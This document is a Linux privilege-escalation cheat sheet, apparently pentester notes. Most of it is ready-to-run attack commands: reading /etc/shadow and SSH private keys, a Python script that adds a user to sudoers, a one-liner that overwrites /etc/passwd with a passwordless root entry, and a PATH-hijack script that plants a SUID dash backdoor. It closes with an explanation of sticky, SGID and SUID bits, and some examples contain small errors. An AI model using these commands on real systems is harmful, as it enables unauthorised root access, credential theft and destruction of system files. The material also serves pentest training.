
# priv esc enumeration scripts
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
https://github.com/rebootuser/LinEnum
https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py
http://pentestmonkey.net/tools/audit/unix-privesc-check
https://github.com/The-Z-Labs/linux-exploit-suggester


# Kernel and OS
uname -a
uname -mrs
cat /etc/issue
cat /etc/lsb-release      # Debian based
cat /etc/redhat-release   # Redhat based

# running services and find services run boy root
ps aux
ps aux | grep root

# which applications are installed
dpkg -l
ls -alh /usr/bin/
ls -alh /sbin/

# scheduled tasks
crontab -l

# port forwarding
ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port

# tunneling
ssh -D 127.0.0.1:9050 -N [username]@[ip]
proxychains ifconfig

# sensitive files
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/

# check home dirs
ls -ahlR /root/
ls -ahlR /home

# private key search
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key


# Sticky Bits & SUID & GUID

find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID

# GTFO Bins:
GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
```
https://gtfobins.github.io/
```

# Commands:
check to see what sudo privledges the user has
```
sudo -l
cat /etc/sudoers
```

# other Super Users?:
```
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 {print $1}'
```

# lists available exploits Linux kernel in kali Linux
```
searchsploit Linux Kernel 2.6.24 
```


# Grep hardcoded passwords:
### Use grep to look for user in filename
```
grep -i user [filename]
```
### Use grep to look for pass in filename
```
grep -i pass [filename]
```
### Use grep to look for password in filename
```
grep -C 5 "password" [filename]
```
### find php file and check them for the variable $password
```
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"
```



# root access:
## list all programs this account has sudo access to
```
sudo -l
```

## find all files with SUID & SGID set
```
find . -perm /2000 
find / -perm -4000 -o -perm -2000
find / -perm -u=s -type f 2>/dev/null
find / -perm /6000
find / -perm /6001   
```

## services which are running as root
```
ps -aux | grep root
```

## check if web server runs as root
```
grep "localhost" ./ -R
```

# Add username to sudoers in python.
```
#!/usr/bin/env python

import os
import sys
try:
        os.system('echo "username ALL=(ALL:ALL) ALL" >> /etc/sudoers')
except:
        sys.exit()
```

# Use Python to run script in zip file:
```
mkdir test
echo 'print("Hello World!!") > test/__main__.py
zip -j test.zip test/*
python test.zip
```



## cronjob
If there is a cronjob that runs as root but it has incorrect file permissions, you can change it to run your SUID binary and get a shell.

## list processes running by root, permissions and NFS exports
```
echo 'services running as root'; ps aux | grep root;  echo 'permissions'; ps aux | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++'; echo 'nfs info'; ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null
```

# if you have write permissions for /etc/passwd 
back up current/etc/passwd
```
cp /etc/passwd /etc/passwd.bak
```
overwrite /etc/passwd to gain root access
```
echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd; su
```


# ltrace
ltrace to find were a program makes system calls:
find a program with Setuid used
```
find /usr/bin -perm -4000
```
find a program that runs with root priveledges
```
ls -l </path/to/program>
```
try program to see what it requires, maybe try a --help flag. use ltrace to check to see if it calls another script or program that we have access to
```
ltrace </path/to/program> <required options to run>
```
look for system calls where the program is not a specific path for example if it calls grep without specifying a path if so create a script to run:

##Grab Hash script:
```
#!/bin/dash
cat /etc/shadow
```
## **note Bash likes to drop setuid permissions but Dash will not**
make executable 
```
chmod 755 grep
```
change PATH so it check your folder first when the program is run
```
export PATH=.:$PATH
```
run the program that has root priveledges and it should call your script and give you the output


# auto-root script
```
nano grep 
#!/bin/dash
cp /bin/dash backdoor
chown root:root backdoor
chmod u+s backdoor
```
make executable 
```
chmod 755 grep
```
change PATH so it check your folder first when the program is run
```
export PATH=.:$PATH
```
run the program backdoor
```
./backdoor 
whoami
id
```
you now have a root shell in dash

---------------------------------------------

## Sticky Bit:

Is mainly used on folders in order to avoid deletion of a folder and its content by other users though they having write permissions on the folder contents. If Sticky bit is enabled on a folder, the folder contents are deleted by only owner who created them and the root user. No one else can delete other users data in this folder(Where sticky bit is set). This is a security measure to avoid deletion of critical folders and their content(sub-folders and files), though other users have full permissions.

## Sticky Bit set:
```
ls -l
-rwxr-xrwt 1 xyz xyzgroup 148 Dec 22 03:46 /opt/dump/
         ^-- Sticky bit with execute permissions set. (lowercase 't')

ls -l
-rwxr-xrwT 1 xyz xyzgroup 148 Dec 22 03:46 /opt/dump/
         ^-- Sticky bit without execute permissions set. (uppercase 'T')
```

## Set Symbolic way:
chmod o+t /opt/dump/

or

chmod +t /opt/dump/

We are setting Sticky Bit(+t) to folder /opt/dump by using chmod command.

## set Numerical way:
chmod 1757 /opt/dump/

Here in 1757, 1 indicates Sticky Bit set, 7 for full permissions for owner, 5 for read and execute permissions for group, and full permissions for others.

## Find Files with SGID set:
find / -perm /1000



## SGID (Set Group ID up on execution):
A special type of file permissions given to a file/folder. Normally in Linux/Unix when a program runs, it inherit’s access permissions from the logged in user. SGID is defined as giving temporary permissions to a user to run a program/file with the permissions of the file group permissions to become member of that group to execute the file. In simple words users will get file Group’s permissions when executing a folder/file/program/command.

SGID is similar to SUID. The difference between both is that SUID assumes owner of the file permissions and SGID assumes group’s permissions when executing a file instead of logged in user inherit permissions. 

## SGID bit:
```
ls -l
-rwxr-sr-- 1 xyz xyzgroup 148 Dec 22 03:46 file1.txt
      ^-- SGID bit with execute permissions set. (lowercase 's')
          Will always run as the group, regardless of the user running the command.

chmod u+s file1.txt
-rwxrwSr-x 1 surendra surendra 0 Dec 27 11:24 file1.txt
      ^-- SGID bit without execute permissions set. (uppercase 'S')
```

## Symbolic way:
chmod g+s file1.txt

sets SGID(+s) to group who owns this file.

## Numerical way:
chmod 2750 file1.txt

Here in 2750, 2 indicates SGID bit’set, 7 for full permissions for owner, 5 for read and execute permissions for group, and no permissions for others. 

## Where is SGID used?
1) When implementing Linux group disk quota. 

## Find Files with SGID set:
find / -perm /2000


## SUID (Set owner User ID up on execution):
A special type of file permissions given to a file. Normally in Linux/Unix when a program runs, it inherit’s access permissions from the logged in user. SUID is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs it. In simple words users will get file owner’s permissions as well as owner UID and GID when executing a file/program/command.

## SUID bit:
```
ls -l
-rwsr--r-- 1 xyz xyzgroup 148 Dec 22 03:46 file1.txt
   ^-- SUID bit with execute permissions set. (lowercase 's')
       Will always run on root, regardless of the user running the command.

chmod u+s file1.txt
-rwSrwxr-x 1 surendra surendra 0 Dec 27 11:24 file1.txt
   ^-- SUID bit without execute permissions set. (uppercase 'S')
```

## set Symbolic way:
chmod u+s file1.txt

Here owner permission execute bit is set to SUID with +s

## set Numerical way:
chmod 4750 file1.txt

Here in 4750, four indicates SUID bit set, seven for full permissions for owner, five for read and execute permissions for group, and no permissions for others.

## Where is SUID used?
1) Where root login is required to execute some commands/programs/scripts.
2) Where you don’t want to give credentials of a particular user, but want to run some programs as the owner.
3) Where you don’t want to use SUDO command, but want to give execute permission for a file/script etc.

## Find Files with SUID Set:
find / -perm /4000


## Find Files with Sticky, SGID & SUID bit set:
find / -perm /7000

## Remove the Sticky, SGID & SUID bits:
chmod 0750 <file/folder>

Here in 0750, zero removes Sticky, SGID & SUID bits, seven for full permissions for owner, five for read and execute permissions for group, and no permissions for others.




